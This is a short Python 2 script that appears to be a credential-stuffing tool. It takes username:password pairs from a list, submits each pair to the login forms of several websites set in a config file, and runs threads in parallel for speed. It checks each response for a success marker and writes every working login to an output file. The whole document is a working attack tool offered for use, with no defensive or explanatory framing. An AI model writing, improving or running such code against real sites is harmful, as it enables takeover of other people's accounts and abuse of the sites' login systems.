#!/usr/bin/python

from Queue import Queue
from threading import Thread
from robobrowser import RoboBrowser
import ConfigParser
import time
import sys

# number of threads (higher the faster)
num_worker_threads = 1

if len(sys.argv) == 2:
    num_worker_threads = int(sys.argv[1])

config = ConfigParser.ConfigParser()
config.read('config.ini')
users = [line.rstrip('\n') for line in open('userlist.txt')]
output = open('output/%d.txt' % (int(time.time())), 'w')
job_list = Queue()

def check(user, section):
    user = user.split(':')
    print 'checking [%s] %s' % (section, user[0])

    br = RoboBrowser(timeout=30, parser='lxml')
    br.open(config.get(section, 'url'))

    form = br.get_form(id=config.get(section, 'form_id'))
    form[config.get(section, 'username')] = user[0]
    form[config.get(section, 'password')] = user[1]

    br.submit_form(form)

    if config.get(section, 'success_sign') in str(br.select):
        print '!! success', user[0], user[1], section, '!!'
        output.write('%s %s %s\n' % (section, user[0], user[1]))

    print 'checking [%s] %s completed' % (section, user[0])

def worker():
    while not job_list.empty():
        item = job_list.get()
        try:
            check(item[0], item[1])
        except Exception, e:
            print '#ERR', e
        job_list.task_done()

def sched_jobs():
    for user in users:
        for section in config.sections():
            job_list.put([user, section])
    for i in range(num_worker_threads):
         t = Thread(target=worker)
         t.daemon = True
         t.start()

# EXECUTE HERE
sched_jobs()
job_list.join()
output.close()
